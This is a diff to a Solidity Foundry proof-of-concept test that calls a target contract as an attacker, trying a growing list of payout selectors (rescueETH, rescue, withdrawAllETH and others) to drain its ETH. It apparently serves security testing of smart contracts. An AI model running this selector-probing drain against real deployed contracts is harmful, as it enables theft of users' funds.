@@ -76,6 +76,24 @@ contract PoC is Test {
         if (bytes(used).length > 0) return used;
         used = _attempt(attacker, before, "release()", abi.encodeWithSignature("release()"));
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "rescueETH(uint256)",
+            abi.encodeWithSignature("rescueETH(uint256)", before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "rescueETH()", abi.encodeWithSignature("rescueETH()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "rescue(address,uint256)",
+            abi.encodeWithSignature("rescue(address,uint256)", attacker, before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "withdrawAllETH()", abi.encodeWithSignature("withdrawAllETH()"));
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -96,7 +114,7 @@ contract PoC is Test {
         assertGt(
             drained,
             0,
-            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
+            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(), rescueETH(uint256), rescueETH(), rescue(address,uint256), withdrawAllETH(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
         );
     }
 }
